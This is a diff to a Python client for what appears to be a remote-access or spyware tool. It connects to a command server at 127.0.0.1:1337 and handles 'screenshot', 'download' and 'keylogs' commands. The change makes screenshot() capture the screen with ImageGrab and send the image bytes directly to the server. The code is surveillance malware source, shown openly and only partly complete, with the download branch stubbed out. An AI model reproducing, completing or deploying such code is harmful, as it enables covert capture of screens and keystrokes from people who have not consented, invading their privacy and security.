@@ -7,7 +7,8 @@ from PIL import ImageGrab
 SERVER_ADDRESS = "127.0.0.1"
 SERVER_PORT = 1337
 
-def screenshot():
+
+def screenshot() -> None:
     """Called upon a screenshot instruction, captures an image of screen and sends to server"""
     # instantiate an empty bytes object
     img = io.BytesIO()
@@ -16,7 +17,7 @@ def screenshot():
     # send the size of the image in bytes to the server
     send(sock, str(img.tell()).encode("utf-8"))
     # send the image to the server
-    return img.getvalue()
+    send(sock, img.getvalue())
 
 
 def handle(data: dict) -> None:
@@ -27,7 +28,7 @@ def handle(data: dict) -> None:
     """
     cmd, args = data.get("cmd"), data.get("args")
     if cmd == "screenshot":
-        send(sock, screenshot())
+        screenshot()  # take and sent a screenshot of the client machine to the server sending the request
     elif cmd == "download":
         pass  # self._download(data.get("args")[0])
     elif cmd == "keylogs":
@@ -47,6 +48,7 @@ def send(sock: socket.socket, data: bytes) -> None:
     """
     sock.sendall(data)
     print(data)
+
 
 def connect(sock: socket.socket, host: str, port: int) -> None:
     """Connects to a server
